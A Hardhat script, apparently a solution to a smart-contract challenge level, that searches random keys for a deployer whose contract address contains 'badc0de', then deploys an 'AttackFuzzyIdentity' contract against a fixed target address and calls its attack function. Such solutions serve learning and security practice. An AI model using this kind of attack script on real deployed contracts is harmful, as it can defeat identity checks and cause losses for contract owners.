const {ethers} = require("hardhat");

const findMatchingPrivateKey = () => {
  const NONCE = 0;
  let foundKey
  // choose 512 bits of randomness like BIP39 would for when deriving seed from mnemonic
  // this is probably very inefficient compared to just deriving a key from randomness
  // as it involves several hash functions when deriving the key from index
  const masterKey = ethers.utils.HDNode.fromSeed(ethers.utils.randomBytes(512 / 8));
  const getPathForIndex = (index) => `m/44'/60'/0'/0/${index}`;

  let counter = 0;

  while (!foundKey) {
    const key = masterKey.derivePath(getPathForIndex(counter));
    const from = key.address;
    const contractAddr = ethers.utils.getContractAddress({
      from,
      nonce: NONCE,
    });
    if (contractAddr.toLowerCase().includes(`badc0de`)) {
      foundKey = key;
    }

    counter++;
    if (counter % 1000 == 0) {
      console.log(`Checked ${counter} addresses`);
    }
  }

  return foundKey.privateKey;
};

async function main() {
    privateKey = findMatchingPrivateKey()
    console.log("Found private key: ", privateKey)

    deployer = new ethers.Wallet(privateKey, ethers.provider)
    console.log("Deployer address: ", deployer.address)

    console.log("Trying to deploy contract ...")
    // deploy attack contract
    const AttackFuzzyIdentity = await ethers.getContractFactory("AttackFuzzyIdentity");
    const attackFuzzyIdentity = await AttackFuzzyIdentity.deploy("0x7ACB9F2917Cb3481176387A06A58B23ADEd6D5E0")
    await attackFuzzyIdentity.deployed();
    console.log("AttackFuzzyIdentity: ", attackFuzzyIdentity.address);

    await attackFuzzyIdentity.attack()
    console.log("Attacked")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
